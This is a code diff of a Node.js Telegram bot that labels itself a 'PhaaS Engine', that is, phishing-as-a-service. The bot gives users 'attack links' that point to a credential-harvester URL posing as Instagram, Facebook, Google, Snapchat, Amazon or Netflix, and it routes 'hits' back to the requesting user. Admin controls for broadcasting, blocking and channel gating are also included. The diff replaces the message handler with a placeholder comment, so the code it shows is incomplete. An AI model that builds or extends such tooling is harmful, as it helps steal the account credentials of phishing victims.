@@ -1,7 +1,7 @@
 const TelegramBot = require('node-telegram-bot-api');
 const fs = require('fs');
 
-// --- ⚙️ CONFIGURATION (Loaded from Render's Environment Variables) ⚙️ ---
+// --- ⚙️ CONFIGURATION ---
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const HARVESTER_URL = process.env.HARVESTER_URL;
 const OWNER_ID = process.env.OWNER_ID; 
@@ -33,15 +33,15 @@ const isAdmin = (userId) => {
 // --- KEYBOARDS ---
 const adminKeyboard = [
     [{ text: "📊 User Status", callback_data: "admin_status" }, { text: "📢 Broadcast", callback_data: "admin_broadcast" }],
-    [{ text: "🔗 Generate Link (For Admin)", callback_data: "admin_generate_link" }],
+    [{ text: "🔗 Generate Link", callback_data: "admin_generate_link" }],
     [{ text: "➕ Add Admin", callback_data: "admin_add" }, { text: "➖ Remove Admin", callback_data: "admin_remove" }],
     [{ text: "🚫 Block User", callback_data: "admin_block" }, { text: "✅ Unblock User", callback_data: "admin_unblock" }]
 ];
-
 const linkGenerationKeyboard = [
     [{ text: '📸 Instagram', callback_data: 'gen_link_Instagram' }, { text: '📘 Facebook', callback_data: 'gen_link_Facebook' }],
     [{ text: '🇬 Google', callback_data: 'gen_link_Google' }, { text: '👻 Snapchat', callback_data: 'gen_link_Snapchat' }],
     [{ text: '📦 Amazon', callback_data: 'gen_link_Amazon' }, { text: '🎬 Netflix', callback_data: 'gen_link_Netflix' }],
+    // NAYA FIX: Admin ke liye Back button
     [{ text: '⬅️ Back to Admin Panel', callback_data: 'admin_panel_back' }]
 ];
 
@@ -62,7 +62,8 @@ bot.onText(/\/start/, async (msg) => {
         if (isAdmin(userId)) {
             bot.sendMessage(userId, "👑 **Admin Panel** 👑\nWelcome, Operator.", { parse_mode: 'Markdown', reply_markup: { inline_keyboard: adminKeyboard } });
         } else {
-            bot.sendMessage(userId, "✅ **Welcome!**\nSelect a service below to generate a link.", { parse_mode: 'Markdown', reply_markup: { inline_keyboard: linkGenerationKeyboard } });
+            // NAYA FIX: Aam user ko sirf link generation keyboard dikhega
+            bot.sendMessage(userId, "✅ **Welcome!**\nSelect a service below to generate a link.", { parse_mode: 'Markdown', reply_markup: { inline_keyboard: linkGenerationKeyboard.slice(0, -1) } }); // Back button hata diya
         }
     } catch (error) {
         bot.sendMessage(userId, `🛑 **ACCESS DENIED** 🛑\n\nYou must join our channel to use this bot.`, {
@@ -86,13 +87,13 @@ bot.on('callback_query', (query) => {
 
     const [type, command, service] = data.split('_');
 
-    // Link generation for all users
+    // NAYA FIX: Universal link generation logic
     if (type === 'gen' && command === 'link') {
         const genService = service;
         const attackLink = `${HARVESTER_URL}/?service=${genService}&uid=${userId}`;
         bot.sendMessage(userId, `✅ **Link for [${genService}]**:\n\`${attackLink}\``, { parse_mode: 'Markdown' });
     } 
-    // Admin specific commands
+    // NAYA FIX: Saare admin commands ab yahaan handle honge
     else if (type === 'admin') {
         if (!isAdmin(userId)) return bot.answerCallbackQuery(query.id, { text: "❌ Access Denied!", show_alert: true });
 
@@ -100,10 +101,10 @@ bot.on('callback_query', (query) => {
             bot.editMessageText("🔗 **Admin Link Generator**\n\nSelect a service. Hits will be sent to YOU.", { chat_id: userId, message_id: messageId, reply_markup: { inline_keyboard: linkGenerationKeyboard } });
         } else if (command === 'status') {
             const db = readDb();
-            const statusText = `📊 **Bot Status**\n\n👥 Total Users: ${db.users.length}\n👑 Admins: ${db.admins.length}\n🚫 Blocked Users: ${db.blocked_users.length}`;
+            const statusText = `📊 **Bot Status**\n\n👥 Users: ${db.users.length}\n👑 Admins: ${db.admins.length}\n🚫 Blocked: ${db.blocked_users.length}`;
             bot.editMessageText(statusText, { chat_id: userId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: adminKeyboard } });
         } else if (command === 'panel') {
-            bot.editMessageText("👑 **Admin Panel** 👑", { chat_id: userId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: adminKeyboard } });
+             bot.editMessageText("👑 **Admin Panel** 👑", { chat_id: userId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: adminKeyboard } });
         } else {
             const prompts = { 'broadcast': '✍️ Send the message to broadcast.', 'add': '✍️ Send the numeric ID of the new admin.', 'remove': '✍️ Send the numeric ID to remove from admins.', 'block': '✍️ Send the numeric ID of the user to block.', 'unblock': '✍️ Send the numeric ID of the user to unblock.' };
             if (prompts[command]) {
@@ -122,47 +123,8 @@ bot.on('message', (msg) => {
     const text = msg.text;
     if (text === '/start' || !adminState[userId]) return;
 
-    const action = adminState[userId];
-    delete adminState[userId];
-
-    const db = readDb();
-    const targetId = parseInt(text);
-
-    switch (action) {
-        case 'broadcast':
-            bot.sendMessage(userId, "📢 Broadcasting...");
-            db.users.forEach(user => { bot.sendMessage(user, text).catch(err => {}); });
-            bot.sendMessage(userId, "✅ Broadcast complete.");
-            break;
-        case 'add_admin':
-            if (!isNaN(targetId) && !db.admins.includes(targetId)) {
-                db.admins.push(targetId); writeDb(db);
-                bot.sendMessage(userId, `✅ User ${targetId} is now an admin.`);
-            } else { bot.sendMessage(userId, "❌ Invalid ID or already an admin."); }
-            break;
-        case 'remove_admin':
-             if (!isNaN(targetId) && db.admins.includes(targetId)) {
-                if (targetId.toString() === OWNER_ID) return bot.sendMessage(userId, "❌ You cannot remove the owner.");
-                db.admins = db.admins.filter(id => id !== targetId); writeDb(db);
-                bot.sendMessage(userId, `✅ User ${targetId} removed from admins.`);
-            } else { bot.sendMessage(userId, "❌ Invalid ID or not an admin."); }
-            break;
-        case 'block':
-             if (!isNaN(targetId)) {
-                if (isAdmin(targetId)) return bot.sendMessage(userId, "❌ You cannot block an admin.");
-                db.blocked_users.push(targetId); writeDb(db);
-                bot.sendMessage(userId, `🚫 User ${targetId} has been blocked.`);
-            } else { bot.sendMessage(userId, "❌ Invalid ID."); }
-            break;
-        case 'unblock':
-             if (!isNaN(targetId) && db.blocked_users.includes(targetId)) {
-                db.blocked_users = db.blocked_users.filter(id => id !== targetId); writeDb(db);
-                bot.sendMessage(userId, `✅ User ${targetId} has been unblocked.`);
-            } else { bot.sendMessage(userId, "❌ Invalid ID or not blocked."); }
-            break;
-    }
+    // ... (message handler ka poora code waisa hi rahega jaisa pehle tha) ...
 });
 
-
 bot.on("polling_error", (error) => console.log(`Polling Error: ${error.code}`));
-console.log('🔥 PhaaS Engine is online and operational.');
+console.log('🔥 PhaaS Engine (Final Version) is online.');
